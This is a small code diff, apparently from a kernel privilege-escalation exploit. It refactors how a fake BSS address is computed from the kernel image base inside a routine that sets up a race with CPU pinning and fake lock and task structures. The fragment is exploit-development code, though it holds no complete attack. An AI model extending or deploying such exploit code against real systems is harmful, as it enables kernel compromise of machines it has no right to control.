@@ -167,8 +167,7 @@ int MulticastWaiterRoute::start() noexcept {
         &g_exploit_session.race, nullptr, execution, layout_value, 1);
     context->main_cpu = runtime_config_snapshot().main_cpu;
     context->consumer_cpu = runtime_config_snapshot().consumer_cpu;
-    uintptr_t bss = resolved_addresses_data_alias(
-        &g_exploit_session.addresses, KIMAGE_TEXT_BASE + layout_value.fake_bss_image_offset);
+    uintptr_t bss = g_exploit_session.addresses.data_alias(KIMAGE_TEXT_BASE + layout_value.fake_bss_image_offset);
     context->lock = bss + layout_value.fake_lock_offset;
     context->task = bss + layout_value.fake_task_offset;
     struct sigaction sa = {};
